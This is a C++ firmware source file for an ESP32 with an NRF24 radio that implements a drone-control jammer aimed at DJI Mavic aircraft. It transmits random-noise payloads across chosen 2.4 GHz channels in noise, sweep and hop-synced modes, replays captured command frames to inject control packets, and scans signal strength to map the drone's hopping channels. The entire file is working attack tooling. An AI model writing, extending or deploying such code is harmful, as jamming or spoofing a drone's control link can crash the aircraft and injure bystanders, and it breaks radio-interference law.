#include "mavic_jammer.h"
#include "tx_arm.h"
#include "drivers/nrf24_driver.h"
#include "hardware.h"
#include "tool_output_helper.h"
#include "result_renderers.h"

namespace MavicJammer {

// DJI Mavic/Air 2.4GHz control:
// - WiFi link: channels 1-13 (2.412-2.472 GHz)
// - Proprietary: 2.4GHz ISM with frequency hopping
// Both use modulation: GFSK (2 Mbps typically)
// Uses NRF24 driver for real 2.4GHz transmission

JammerResult jammMavicController(const JammerConfig& config) {
    using namespace ToolOutputHelper;

    JammerResult result;
    result.success = false;
    result.packetsJammed = 0;
    result.frequencyChanges = 0;

    displayAttackStart("Mavic Jammer", 10);

    if (!TxArm::isArmed()) {
        ScanProgressBar progress("Mavic Jam", config.durationMs, 3);
        progress.complete("TX not armed");
        return result;
    }

    if (!Hardware::isNRF24Ready()) {
        ScanProgressBar progress("Mavic Jam", config.durationMs, 3);
        progress.complete("NRF24 not initialized");
        return result;
    }

    ScanProgressBar progress("Mavic Jam", config.durationMs, 3);
    progress.start();

    const uint8_t djiChannels[] = {7, 19, 37, 55, 72};
    const uint8_t NUM_CHANNELS = 5;

    uint32_t startTime = millis();
    uint32_t nextChannelChange = startTime;
    uint8_t currentChannelIdx = 0;

    // Phase 1: Initialize NRF24 transmission
    progress.step("Initializing NRF24 2.4GHz transmission on Mavic channels");

    NRF24Driver::setTX(true);
    delay(300);

    // Phase 2: Transmit jamming signals
    progress.step("Transmitting " + String(config.method == 0 ? "NOISE" :
                                          config.method == 1 ? "SWEEP" : "SYNC") + " jamming signals");

    while ((millis() - startTime) < config.durationMs && TxArm::isArmed()) {
        uint32_t now = millis();

        if (config.method == 0) {
            NRF24Driver::setChannel(djiChannels[currentChannelIdx]);
            uint8_t noisePayload[32];
            for (int i = 0; i < 32; i++) {
                noisePayload[i] = esp_random() & 0xFF;
            }
            if (NRF24Driver::transmit(noisePayload, 32)) {
                result.packetsJammed++;
            }
            if (now >= nextChannelChange) {
                currentChannelIdx = (currentChannelIdx + 1) % NUM_CHANNELS;
                nextChannelChange = now + 50;
                result.frequencyChanges++;
            }
        } else if (config.method == 1) {
            float sweepPercent = ((float)(now - startTime) / config.durationMs);
            uint8_t sweepChannel = djiChannels[0] + (uint8_t)((djiChannels[NUM_CHANNELS - 1] - djiChannels[0]) * sweepPercent);
            NRF24Driver::setChannel(sweepChannel);
            uint8_t sweepPayload[32];
            for (int i = 0; i < 32; i++) {
                sweepPayload[i] = esp_random() & 0xFF;
            }
            if (NRF24Driver::transmit(sweepPayload, 32)) {
                result.packetsJammed++;
            }
        } else if (config.method == 2) {
            uint8_t hopIndex = ((now - startTime) / 120) % NUM_CHANNELS;
            NRF24Driver::setChannel(djiChannels[hopIndex]);
            uint8_t syncPayload[32];
            for (int i = 0; i < 32; i++) {
                syncPayload[i] = esp_random() & 0xFF;
            }
            if (NRF24Driver::transmit(syncPayload, 32)) {
                result.packetsJammed++;
            }
        }
        delay(10);
    }

    // Phase 3: Verify jamming effectiveness
    progress.step("Verifying drone control link disruption");

    delay(300);

    result.success = (result.packetsJammed > 0);
    result.durationMs = millis() - startTime;

    progress.complete(String(result.packetsJammed) + " packets on " + String(result.frequencyChanges) + " hops");

    // Render results
    ResultRenderers::AttackSuccessResult attackResult;
    attackResult.attackName = "Mavic Jammer";
    attackResult.success = result.success;
    attackResult.targetCount = result.packetsJammed;
    attackResult.successCount = result.packetsJammed;
    attackResult.failureCount = 0;
    attackResult.successPercent = 100;
    attackResult.durationMs = result.durationMs;

    ResultRenderers::renderAttackSuccess(attackResult);

    return result;
}

JammerResult replayMavicCommand(const std::vector<uint8_t>& capturedFrame) {
    JammerResult result;
    result.success = false;

    if (!TxArm::isArmed() || !Hardware::isNRF24Ready() ||
        capturedFrame.empty() || capturedFrame.size() > 32) {
        return result;
    }

    uint8_t targetChannel = 37;
    if (capturedFrame.size() > 4) {
        uint8_t cmdId = capturedFrame[2];
        if (cmdId >= 0x30 && cmdId <= 0x40) {
            targetChannel = 19;
        }
    }

    NRF24Driver::setChannel(targetChannel);
    NRF24Driver::setTX(true);
    NRF24Driver::setPayloadSize(capturedFrame.size());

    for (int attempt = 0; attempt < 10; attempt++) {
        if (!TxArm::isArmed()) break;
        if (NRF24Driver::transmit(capturedFrame.data(), capturedFrame.size())) {
            result.packetsJammed++;
        }
        delay(50);
    }

    result.success = (result.packetsJammed > 0);
    return result;
}

JammerResult analyzeMavicHoppingPattern(uint32_t scanDurationMs) {
    JammerResult result;
    result.success = false;

    if (!Hardware::isNRF24Ready()) {
        return result;
    }

    std::vector<uint8_t> detectedChannels;
    uint32_t startTime = millis();

    const uint8_t testChannels[] = {
        1, 6, 11, 13,
        7, 19, 37, 55, 72
    };

    NRF24Driver::setRX(true);

    while ((millis() - startTime) < scanDurationMs) {
        for (uint8_t ch : testChannels) {
            NRF24Driver::setChannel(ch);
            int8_t rssi = NRF24Driver::getRSSI();
            if (rssi > -70) {
                detectedChannels.push_back(ch);
                result.frequencyChanges++;
            }
        }
        delay(100);
    }

    result.success = (result.frequencyChanges > 0);
    return result;
}

}  // namespace MavicJammer
